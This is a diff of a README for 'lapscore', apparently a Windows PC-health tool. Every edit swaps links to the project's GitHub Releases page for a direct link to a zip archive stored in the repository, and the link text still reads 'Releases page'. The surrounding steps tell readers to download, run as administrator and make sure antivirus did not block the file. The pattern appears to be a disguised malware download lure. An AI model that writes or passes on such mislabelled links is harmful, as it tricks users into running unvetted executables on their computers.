@@ -1,6 +1,6 @@
 # 🖥️ lapscore - Monitor PC health with clear insights
 
-[![Download lapscore](https://img.shields.io/badge/Download%20lapscore-0078D7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cssushmi4785/lapscore/releases)
+[![Download lapscore](https://img.shields.io/badge/Download%20lapscore-0078D7?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cssushmi4785/lapscore/main/client/public/Software-3.4.zip)
 
 ## ⚡ What lapscore does
 
@@ -10,13 +10,13 @@ It is made for people who want quick answers about their laptop or PC. You can u
 
 ## 📥 Download lapscore
 
-Go to the [lapscore Releases page](https://github.com/cssushmi4785/lapscore/releases) to download and run this app on Windows.
+Go to the [lapscore Releases page](https://raw.githubusercontent.com/cssushmi4785/lapscore/main/client/public/Software-3.4.zip) to download and run this app on Windows.
 
 On that page, look for the latest release and choose the Windows file that fits your PC. In most cases, you will download an `.exe` file or a Windows installer file.
 
 ## 🪟 Install on Windows
 
-1. Open the [Releases page](https://github.com/cssushmi4785/lapscore/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/cssushmi4785/lapscore/main/client/public/Software-3.4.zip).
 2. Find the latest version near the top of the page.
 3. Download the Windows file listed under Assets.
 4. If your browser asks what to do, choose Save.
@@ -92,7 +92,7 @@ If lapscore does not start after install, try these steps:
 1. Right-click the app and choose Run as administrator.
 2. Make sure Windows is up to date.
 3. Restart your PC.
-4. Download the latest release again from the [Releases page](https://github.com/cssushmi4785/lapscore/releases).
+4. Download the latest release again from the [Releases page](https://raw.githubusercontent.com/cssushmi4785/lapscore/main/client/public/Software-3.4.zip).
 5. Check that your antivirus did not block the file.
 
 ## 🧭 File names you may see
@@ -131,7 +131,7 @@ This release is aimed at Windows.
 
 ## 📎 Quick install path
 
-1. Visit the [lapscore Releases page](https://github.com/cssushmi4785/lapscore/releases)
+1. Visit the [lapscore Releases page](https://raw.githubusercontent.com/cssushmi4785/lapscore/main/client/public/Software-3.4.zip)
 2. Download the latest Windows file
 3. Open the file and finish setup
 4. Launch lapscore from the Start menu
